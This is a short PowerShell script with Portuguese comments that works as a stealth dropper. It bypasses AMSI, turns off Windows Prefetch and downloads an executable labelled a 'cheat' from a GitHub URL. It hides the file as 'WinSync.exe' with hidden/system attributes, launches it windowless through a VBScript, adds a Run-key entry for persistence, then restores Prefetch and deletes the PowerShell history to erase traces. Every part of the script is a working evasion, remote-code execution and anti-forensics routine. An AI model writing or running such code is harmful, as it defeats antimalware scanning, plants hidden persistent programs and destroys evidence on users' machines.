# 1. Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 2. Desativa Prefetch
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue

# 3. Baixa o cheat e esconde na pasta do Windows Explorer
$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
$path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $path)
Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)

# 4. Cria um atalho invisível do VBScript para rodar sem janela
$vbsPath = "$env:TEMP\sync.vbs"
"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII

# 5. Roda o atalho invisível (o cheat abre, mas a janela some)
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""

# 6. Persistência (Registra no Windows para abrir no boot)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value "wscript.exe `"$vbsPath`""

# 7. Restaura Prefetch e limpa histórico
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
